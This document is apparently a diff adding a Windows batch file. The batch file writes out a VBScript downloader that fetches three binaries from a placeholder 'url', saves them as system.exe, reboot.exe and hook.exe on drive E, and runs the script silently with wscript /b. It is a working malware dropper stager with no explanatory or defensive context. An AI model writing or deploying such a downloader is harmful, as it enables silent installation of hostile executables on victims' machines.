@@ -1,0 +1,32 @@
+del e:\zl.vbs
+echo Set Post = CreateObject("Msxml2.XMLHTTP") >> E:\zl.vbs
+echo Post.Open "GET","url",0 >> E:\zl.vbs
+echo Post.Send() >> E:\zl.vbs
+echo Set aGet = CreateObject("ADODB.Stream") >> E:\zl.vbs
+echo aGet.Mode = 3 >> E:\zl.vbs
+echo aGet.Type = 1 >> E:\zl.vbs
+echo aGet.Open() >> E:\zl.vbs
+echo aGet.Write(Post.responseBody) >> E:\zl.vbs
+echo aGet.SaveToFile "e:\system.exe",2 >> E:\zl.vbs
+
+echo Set cPost = CreateObject("Msxml2.XMLHTTP") >> E:\zl.vbs
+echo cPost.Open "GET","url",0 >> E:\zl.vbs
+echo cPost.Send() >> E:\zl.vbs
+echo Set cGet = CreateObject("ADODB.Stream") >> E:\zl.vbs
+echo cGet.Mode = 3 >> E:\zl.vbs
+echo cGet.Type = 1 >> E:\zl.vbs
+echo cGet.Open() >> E:\zl.vbs
+echo cGet.Write(cPost.responseBody) >> E:\zl.vbs
+echo cGet.SaveToFile "e:\reboot.exe",2 >> E:\zl.vbs
+
+echo Set dPost = CreateObject("Msxml2.XMLHTTP") >> E:\zl.vbs
+echo dPost.Open "GET","url",0 >> E:\zl.vbs
+echo dPost.Send() >> E:\zl.vbs
+echo Set dGet = CreateObject("ADODB.Stream") >> E:\zl.vbs
+echo dGet.Mode = 3 >> E:\zl.vbs
+echo dGet.Type = 1 >> E:\zl.vbs
+echo dGet.Open() >> E:\zl.vbs
+echo dGet.Write(dPost.responseBody) >> E:\zl.vbs
+echo dGet.SaveToFile "e:\hook.exe",2 >> E:\zl.vbs
+
+wscript /b e:\zl.vbs
